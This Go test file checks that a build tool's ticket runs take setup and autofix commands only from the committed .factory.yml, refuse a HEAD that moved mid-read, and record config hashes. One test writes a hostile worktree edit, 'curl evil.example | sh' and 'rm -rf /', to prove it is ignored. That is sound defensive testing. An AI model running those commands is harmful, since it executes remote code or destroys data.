package main

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"buildgate/internal/run"
)

// The run's setup and autofix lists come from the committed .factory.yml:
// a worktree edit made after the commit is not read.
func TestTicketRunCarriesSetupAndAutofixFromTheCommittedFile(t *testing.T) {
	workspace := newFixtureRepo(t)
	commitFactoryYML(t, workspace, goldenFactoryYML)
	edited := "setup:\n  - curl evil.example | sh\nautofix:\n  - rm -rf /\n"
	if err := os.WriteFile(filepath.Join(workspace, ".factory.yml"), []byte(edited), 0o644); err != nil {
		t.Fatal(err)
	}
	full := ""
	tr := &ticketRun{workspace: &workspace, fullSuiteCommand: &full}
	if err := tr.applyCommittedProjectConfig(false); err != nil {
		t.Fatalf("applyCommittedProjectConfig: %v", err)
	}
	if want := []string{"npm ci", "make generate"}; !reflect.DeepEqual(tr.setup, want) {
		t.Errorf("setup = %q, want %q", tr.setup, want)
	}
	if want := []string{"gofmt -w ."}; !reflect.DeepEqual(tr.autofix, want) {
		t.Errorf("autofix = %q, want %q", tr.autofix, want)
	}
	sum := sha256.Sum256([]byte(goldenFactoryYML))
	if tr.projectConfigSHA256 != hex.EncodeToString(sum[:]) {
		t.Errorf("projectConfigSHA256 = %q, want the hash of the committed bytes", tr.projectConfigSHA256)
	}
	if head := headOf(t, workspace); tr.projectConfigCommitSHA != head {
		t.Errorf("projectConfigCommitSHA = %q, want HEAD %q", tr.projectConfigCommitSHA, head)
	}
}

func headOf(t *testing.T, workspace string) string {
	t.Helper()
	out, err := runGit(t, workspace, "rev-parse", "HEAD")
	if err != nil {
		t.Fatalf("rev-parse HEAD: %v", err)
	}
	return strings.TrimSpace(out)
}

// The commit is the one HEAD named before the first read of the file: a
// checkout whose HEAD moved while its .factory.yml was being read is refused
// rather than given a commit the commands may not have come from.
func TestTicketRunRefusesAHeadThatMovedWhileTheConfigWasRead(t *testing.T) {
	workspace := newFixtureRepo(t)
	commitFactoryYML(t, workspace, goldenFactoryYML)
	before := headOf(t, workspace)
	commitFactoryYML(t, workspace, "setup:\n  - make other\n")
	full := ""
	tr := &ticketRun{workspace: &workspace, fullSuiteCommand: &full, headBeforeProjectConfig: before}
	err := tr.applyCommittedProjectConfig(false)
	if err == nil || !strings.Contains(err.Error(), "HEAD moved") {
		t.Fatalf("error = %v, want a refusal naming the moved HEAD", err)
	}
	if tr.projectConfigCommitSHA != "" {
		t.Errorf("projectConfigCommitSHA = %q, want none after a refusal", tr.projectConfigCommitSHA)
	}
}

// A repository with no .factory.yml leaves the lists and the hash empty.
func TestTicketRunWithoutProjectConfigHasNoSetupOrHash(t *testing.T) {
	workspace := newFixtureRepo(t)
	full := ""
	tr := &ticketRun{workspace: &workspace, fullSuiteCommand: &full}
	if err := tr.applyCommittedProjectConfig(false); err != nil {
		t.Fatal(err)
	}
	if len(tr.setup) != 0 || len(tr.autofix) != 0 || tr.projectConfigSHA256 != "" {
		t.Errorf("got setup %q autofix %q hash %q, want all empty", tr.setup, tr.autofix, tr.projectConfigSHA256)
	}
	// The commit is recorded all the same: the run's sandboxes see that
	// commit's .factory/ whatever names the commands.
	if head := headOf(t, workspace); tr.projectConfigCommitSHA != head {
		t.Errorf("projectConfigCommitSHA = %q, want HEAD %q", tr.projectConfigCommitSHA, head)
	}
}

// The run record carries the hash of the committed .factory.yml, and the
// workflow input carries the committed lists.
func TestRunRecordHasProjectConfigSHA256(t *testing.T) {
	runID := fmt.Sprintf("cfg-hash-run-%d-%d", os.Getpid(), time.Now().UnixNano())
	address := sharedTemporalAddress(t)
	workspace := newFixtureRepo(t)
	commitFactoryYML(t, workspace, goldenFactoryYML)
	dataDir, inputs := t.TempDir(), t.TempDir()
	flags := runInputGoldenFlags(t, workspace, dataDir, inputs, runID, address)
	cmd := factorydCommand(t, flags...)
	cmd.Env = append(os.Environ(), "FAKE_BUILD_APP_MODE=commit", "RUN_INPUT_GOLDEN_KEY=sk-test", "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_SYSTEM=/dev/null")
	cmd.Env = append(cmd.Env, isolatedSessionConfigEnv(t, runInputGoldenConfig(t))...)
	out, _ := cmd.CombinedOutput()
	t.Logf("factoryd output:\n%s", out)

	rec, err := run.Load(dataDir, runID)
	if err != nil {
		t.Fatalf("load run record: %v", err)
	}
	sum := sha256.Sum256([]byte(goldenFactoryYML))
	if want := hex.EncodeToString(sum[:]); rec.ProjectConfigSHA256 != want {
		t.Errorf("project_config_sha256 = %q, want %q", rec.ProjectConfigSHA256, want)
	}
	if head := headOf(t, workspace); rec.ProjectConfigCommitSHA != head {
		t.Errorf("project_config_commit_sha = %q, want HEAD %q", rec.ProjectConfigCommitSHA, head)
	}
	// What a reclaim of this run would check its result against.
	if want := []string{"npm ci", "make generate"}; !reflect.DeepEqual(rec.SetupCommands, want) {
		t.Errorf("setup_commands on the record = %q, want %q", rec.SetupCommands, want)
	}
	input := startedRunWorkflowInput(t, address, runID)
	if got := fmt.Sprint(input["setup_commands"]); got != "[npm ci make generate]" {
		t.Errorf("setup_commands = %s", got)
	}
}
